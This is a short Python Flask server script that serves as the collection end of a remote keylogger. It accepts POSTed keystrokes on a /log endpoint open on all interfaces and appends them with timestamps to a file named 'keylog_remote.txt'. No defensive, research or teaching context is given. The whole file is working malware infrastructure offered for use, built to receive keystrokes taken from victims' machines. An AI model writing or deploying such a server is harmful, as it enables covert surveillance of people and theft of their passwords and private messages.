# server.py
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    key = data.get('key')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open("keylog_remote.txt", "a") as f:
        f.write(f"{timestamp} - {key}\n")

    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
